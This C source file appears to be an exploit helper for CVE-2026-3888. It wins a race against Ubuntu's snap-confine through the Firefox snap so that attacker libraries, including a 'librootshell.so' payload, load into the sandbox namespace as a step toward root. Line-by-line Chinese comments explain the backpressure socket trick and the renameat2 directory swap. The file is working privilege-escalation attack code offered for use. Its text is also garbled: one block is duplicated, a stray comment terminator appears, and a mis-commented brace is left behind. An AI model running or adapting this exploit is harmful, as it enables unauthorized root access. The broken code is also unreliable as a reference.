/*
 * firefox_2404.c - CVE-2026-3888 Race Helper
 *
 * https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
 *
 * Build:
 *   gcc -O2 -static -o firefox_2404 firefox_2404.c
 *
 * Usage:
 *   Run from /tmp inside sandbox:
 *     ./firefox_2404 <payload.so>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>

/* snap-confine binary path 限制二进制文件路径 */
#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"

/* 交换目录：比赛期间已交换（有效负载 <-> 真实库） */
#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"    //SRC -- source -- 源
#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"             //DST -- destination -- 目的

/* 用于满足模拟阶段的真实库的来源 */
#define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"

/* 步骤 1（安全交换点）之后的调试输出标记 */
#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""

static int copy_file(const char *src, const char *dst)    //static 这个函数只在“当前 .c 文件内部可见” | int 这个函数执行完会返回一个整数return 0;成功, return -1;失败 | char * = 字符指针 = 字符串 | const 指向的内容不能被修改
{
    char buf[65536];    //64KB 缓冲区
    ssize_t n;    //保存 read 返回值（读取了多少字节）
    int fds = open(src, O_RDONLY);    //只读打开源文件

    if (fds < 0)
        return-1;    //判断是否失败：open 失败返回 -1

    /* 0755 so snap-confine can read/execute the libraries */
    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);    //只写，不存在就创建，存在就清空，  这些是库文件，需要可执行权限

    if (fdd < 0) {
        close(fds);
        return-1;    //关闭已经打开的源文件，防止 fd 泄漏
    }
    while ((n = read(fds, buf, sizeof(buf))) > 0)    //从源文件读取最多 64KB，n = read(...)：>0读到数据，0文件结束，-1出错
        write(fdd, buf, n);        //写入目标文件
    close(fds);    //int fds = open(src, O_RDONLY);
    close(fdd);    //int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    return 0;
}

/*
 *设置快照并交换数据（操作）
 *创建 .snap 布局，并将实际的库文件real libs填充到交换目录exchange dir中。
 */
static int setup_snap_and_exchange(const char *payload_so)
{
    mkdir(".snap", 0755);
    mkdir(".snap/usr", 0755);
    mkdir(".snap/usr/lib", 0755);
    mkdir(".snap/usr/local", 0755);
    mkdir(".snap/snap", 0755);
    mkdir(".snap/snap/firefox", 0755);

    /* Create expected firefox data-dir structure创建预期的 Firefox 数据目录结构 */
    DIR *d = opendir("/snap/firefox");        //d = “目录流”（目录句柄）,如果成功：d != NULL, 如果失败： d == NULL
    if (d) {
        struct dirent *ent;    //struct = 把多个不同类型的数据“打包在一起” ,struct变量 用法.  struct指针 用法-> | dirent目录里的“一个文件/子目录”,每个都会被读到 ent
        while ((ent = readdir(d)) != NULL) {        //readdir(d):返回下一个目录项
            if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {        //ent->d_name:当前文件/目录的名字 //不是隐藏目录（不是 . 开头）//strcmp(a, b) 0相等 ≠0不相等，!= 0 表示 不等于 "current"
                char p[512];    //512字节的字符数组（字符串缓冲区）
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);    //p输出缓冲区, ent->d_name替换 %s
                mkdir(p, 0755);
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);    //继续用同一个 p（覆盖旧内容）, snprintf限制最大长度 → 安全| sprintf(p, "...", ...)不检查长度 → 可能溢出
                mkdir(p, 0755);
            }
        }
        closedir(d);
    }

    /* 复制真实的库文件，以便模拟阶段成功（稍后替换 ld-linux） */  
    mkdir(EXCHANGE_SRC, 0755);    //创建一个目录：.exchange | 展开宏后是：mkdir(".snap/usr/lib/x86_64-linux-gnu.exchange", 0755);
    d = opendir(REAL_LIBDIR);    //打开目录 | 展开宏：d = opendir("/snap/core22/current/usr/lib/x86_64-linux-gnu");
    // if (!d) {    //错误判断
        perror("opendir real libdir");    //perror:打印错误信息
        return-1;    //函数执行失败，直接退出
    }    //opendir 打开一个目录，准备遍历它, 成功 指向目录的指针（DIR *） | 失败 NULL

    int count = 0;    //count → 统计处理了多少个文件/目录
    struct dirent *ent;    //ent → 当前读取到的目录项（指针）
    while ((ent = readdir(d)) != NULL) {    //ent = 当前目录里的一个文件/目录，d_name[1] = '\0'   ← 字符串结束符，
        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))    //ent->d_name[0] && 和 ent->d_name[1]情况1 || ent->d_name[1] ent->d_name[2]情况2
            continue;    //跳过当前循环（不处理），//"%s/%s":目录 + "/" + 文件名
        char src[4096];    //构造路径 
        char dst[4096];    
        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);    //原始文件位置/snap/core22/current/usr/lib/x86_64-linux-gnu/xxx.so
        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);    //目标复制位置 .snap/usr/lib/x86_64-linux-gnu.exchange/xxx.so
        //这两个路径必须一一对应：REAL_LIBDIR/libc.so -> REAL_LIBDIR/libc.so 
        //对于每一个文件名： 构造它在原目录的位置（src）, 构造它在原目录的位置（src）
        //snprintf(...) 安全地拼接字符串（防止溢出）
        
        struct stat st;    //获取文件信息，stat跟随符号链接,看到的是 libc.so.6（真实文件）

        if (lstat(src, &st) < 0)    //lstat获取文件信息：文件类型、权限、大小等, lstat不跟随符号链接,看到的是 libc.so（链接本身）
            continue;    //用 lstat,可以知道：这个文件本身是不是符号链接
        if (S_ISDIR(st.st_mode)) {    //st.st_mode 文件类型 + 权限     判断类型 S_ISDIR是目录？
            mkdir(dst, 0755);
        } else if (S_ISLNK(st.st_mode)) {    /S_ISLNK/是符号链接？
            /* 保留符号链接，许多 .so 文件是链接到带版本名称的符号链接 */
            char link[4096];    //符号链接的行为：readlink + symlink
            ssize_t len = readlink(src, link, sizeof(link)-1);
                                         // sizeof(link)-1 ，最多读取多少字节，-1 是为了后面手动加 \0，，，readlink 不会自动加 '\0'
                                         //读取“符号链接指向哪里”，放进 link 这个字符串里，libc.so  →  libc.so.6，，，libc.so 只是一个“快捷方式”，真正的文件是 libc.so.6，，，不是复制文件内容！而是读取“它指向谁”
            if (len > 0) { link[len] = '\0'; symlink(link, dst); }    //创建符号链接（symbolic link),link被指向的目标， dst创建出来的符号链接路径，在 dst 这个位置，创建一个“快捷方式”，指向 link   
        } else {
            copy_file(src, dst);    //把 src 文件的内容复制到 dst 文件
        }
        count++;
    }
    closedir(d);
    printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
    return 0;
}

/*
 * 创建标准错误套接字（函数）*
 * 创建一个具有最小缓冲区（约 1 字节）的 UNIX 套接字对。*
 * 回压技巧：
 * - 快照限制将调试输出写入标准错误（套接字）
 * - 缓冲区几乎立即填满 -> 写入（）阻塞
 * - 我们的每次读取（）释放 1 字节 -> 短暂解除阻塞*
 * 结果是：我们能够逐字节控制执行，从而有效地将一个极小的竞态窗口转变为可控的暂停。
 */
//创建一对“极小缓冲”的本地 socket，用来人为制造阻塞（backpressure），常用于劫持/控制 stderr 的写入节奏
static int create_stderr_socket(int *read_fd, int *write_fd)
{
    int sv[2];    //创建一对本地全双工通信管道,sv[0] ↔ sv[1] 双向通信,socketpair创建一对本地通信 socket（双向管道）

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {    //AF_UNIX 本地进程通信（不走网络）,SOCK_STREAN 类似 TCP 的可靠字节流,0默认协议,sv输出的两个 fd（数组）
        perror("socketpair"); return-1;    //perror 错误输出
    }    //socketpair 返回值：0成功，-1失败
    /*
     * 将缓冲区大小设置为 1 字节
     * 内核可能会向上取整到其最小值，但效果是一样的
     * 在写入仅几字节后就会进行限制
     */
    //核心操作：把 buffer 调到极小,“阻塞 stderr 输出” 技术,sv[0] ↔ sv[1] 这两个 fd 可以互相读写
    int bufsize = 1;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    *read_fd = sv[0];
    *write_fd = sv[1];
    return 0;
}

/* 
 * run_and_race() 运行与赛跑()
 * Main race logic:主赛跑逻辑：
 *-Creates the backpressure socket pair - 创建反向压力套接字对
 *-Read output byte-by-byte- 逐字节读取输出
 *-Detect trigger - 检测触发信号
 *-Swap directories- 切换目录
 */
//父进程制造一个“会阻塞 stderr 的 socket”，子进程伪装成 snap-confine，在执行关键 system 操作前进入可控阻塞状态，用于制造 race condition 时间窗口
static int run_and_race(void)
{
    int read_fd;
    int write_fd;    //给 child 用（写 stderr）
    if (create_stderr_socket(&read_fd, &write_fd) < 0)
        return-1;
    pid_t pid = fork();    //fork：制造攻击结构  //fork() 会：复制当前进程 → 生成一个“几乎完全一样的新进程” //pid_t是类型type,专门用来存“进程ID”的整数类型
                            //pid 这是一个变量，用来存：fork() 的返回值,关键：pid不是“进程”，是“标记”
    if (pid < 0) {
        perror("fork");
        return-1;
    }
    if (pid == 0) {
        /* Child 子进程: become snap-confine 容器 */
        close(read_fd);    //read_fd 是 socketpair 的“读端”，子进程只保留“写端”，避免干扰或死锁
        /* 将stderr重定向到背压套接字的写端 */
        dup2(write_fd, STDERR_FILENO);    //劫持 stderr，把：stderr（标准错误输出），重定向到：socket 的 write_fd
        //STDERR_FILENO 是一个宏（macro）常量：标准错误输出（stderr）的文件描述符编号，STDERR_FILENO = 2代表“错误输出通道”
        //dup2(oldfd, newfd);把一个文件描述符“复制/重定向”到另一个固定位置，把“标准错误输出（fd=2）”改成指向 write_fd，把“错误输出”变成攻击工具
        //把 STDERR（fd=2）改成“指向 write_fd”，stderr 的输出目标变成 write_fd
        //stderr 的“目标”其实是一个 文件描述符 2 指向的设备（终端屏幕上） 默认 fd 2 → /dev/tty（当前终端）
        //dup2(write_fd, 2); 变成2 → socket(write_fd)
        close(write_fd);//关闭原始 write_fd，原 fd 不再需要，避免 fd 泄漏
        clearenv();    //清空环境变量
        /* 启用详细调试输出（用于触发检测） */
        setenv("SNAPD_DEBUG", "1", 1);    //开启 debug 模式，debug = 更多日志输出 = 更多 stderr 写入
                                        //直接增加：socket 写压力，阻塞概率，race 成功率
        setenv("SNAP_INSTANCE_NAME", "firefox", 1);    //伪装当前 snap 实例是：Firefox snap
        //setenv() 是 Linux/Unix 下用来设置环境变量的函数。
        //int setenv(const char *name, const char *value, int overwrite);
        //int setenv(变量名，value值， overwrite是否覆盖0为不覆盖（如果已存在就不改）1为覆盖（强制修改）

        /*
        * Run snap-confine:
        *-write PID + perms for verification 写PID + perms进行验证
        *-keep namespace alive 保持命名空间存活
        */
        execl(SNAP_CONFINE, "snap-confine",
              "--base", "core22",
              "snap.firefox.hook.configure",
              "/bin/sh", "-c",
              "echo $$ > /tmp/race_pid.txt; "
              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
              "> /tmp/race_perms.txt 2>&1; "
              "sleep 99994",
              NULL);
        _exit(1);
    }

        */
        execl(SNAP_CONFINE, "snap-confine",
              "--base", "core22",
              "snap.firefox.hook.configure",
              "/bin/sh", "-c",
              "echo $$ > /tmp/race_pid.txt; "
              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
              "> /tmp/race_perms.txt 2>&1; "
              "sleep 99994",
              NULL);
        _exit(1);
    }

    /* Parent: read snap-confine's output and watch for trigger */
    close(write_fd);
    /* Ring buffer to detect TRIGGER */
    char ringbuf[4096];
    int ringpos = 0;
    memset(ringbuf, 0, sizeof(ringbuf));
    int tlen = strlen(TRIGGER);
    char byte;
    ssize_t n;
    int swapped = 0;
    printf("[*] Reading snap-confine output (PID %d)...\n", pid);

    /* Read 1 byte-> briefly unblock writer-> regain control */
    while ((n = read(read_fd, &byte, 1)) > 0) {
        /* Echo snap-confine's output to stdout for visibility */
        write(STDOUT_FILENO, &byte, 1);

        /* Add byte to ring buffer */
        ringbuf[ringpos % sizeof(ringbuf)] = byte;
        ringpos++;

        /* Check for trigger once we have enough bytes */
        if (!swapped && ringpos >= tlen) {
            char check[512];
            for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)
                check[i] = ringbuf[(ringpos-tlen + i) % sizeof(ringbuf)];
            check[tlen] = '\0';

            if (strstr(check, TRIGGER)) {
                printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");

                /* Trigger hit: snap-confine paused after Step 1-> safe to swap */
                #ifndef RENAME_EXCHANGE
                #define RENAME_EXCHANGE (1 << 1)
                #endif
                if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                            AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
                    /* Atomic swap succeeded */
                } else {
                    /* Fallback if renameat2 unavailable (non-atomic) */
                    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
                    rename(EXCHANGE_SRC, EXCHANGE_DST);
                }

                swapped = 1;
                printf("[+] SWAP DONE! Race won.\n");
                printf("[*] Do NOT close this terminal.\n");
            }
        }
    }
    close(read_fd);
    int status;
    waitpid(pid, &status, 0);
    if (swapped)
        printf("[+] Race won! Our libraries are in the namespace.\n");
    else
        printf("[-] Trigger not detected. Race lost.\n");
    return swapped ? 0 :-1;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
        fprintf(stderr, "  payload.so: librootshell.so-the dynamic loader shellcode\n");
        return 1;
    }
    printf("[*] CVE-2026-3888-firefox 24.04 helper\n");
    printf("[*] Original research by Qualys (https://www.qualys.com)\n");
    printf("[*] CWD: ");
    fflush(stdout);
    system("pwd");
    printf("[*] Setting up .snap and .exchange directory...\n");

    if (setup_snap_and_exchange(argv[1]) < 0)
        return 1;
    printf("[*] Starting race against snap-confine...\n");
    if (run_and_race() < 0)
        return 1;
    printf("[+] Done. Proceed to Phase 4: overwrite ld-linux and trigger root.\n");
    return 0;
}
